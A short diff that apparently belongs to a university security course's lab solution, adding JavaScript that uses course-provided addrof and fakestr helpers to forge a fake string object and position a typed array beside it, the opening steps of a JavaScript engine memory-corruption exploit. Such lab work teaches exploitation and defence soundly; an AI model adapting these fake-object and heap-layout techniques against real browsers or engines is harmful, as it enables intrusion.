@@ -1,7 +1,8 @@
 /*
  * TODO: Part B solution goes here!
  */
-
+let dataPlane = new Uint32Array(1);
+let fakedStr = cs361s.fakestr(cs361s.addrof("\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00") + 16);
 
 let heapArray = new Uint32Array(72);
 while (cs361s.addrof(heapArray) < cs361s.addrof(fakedStr) || cs361s.addrof(heapArray) > cs361s.addrof(fakedStr) - 72 + 16 + 10000000) {
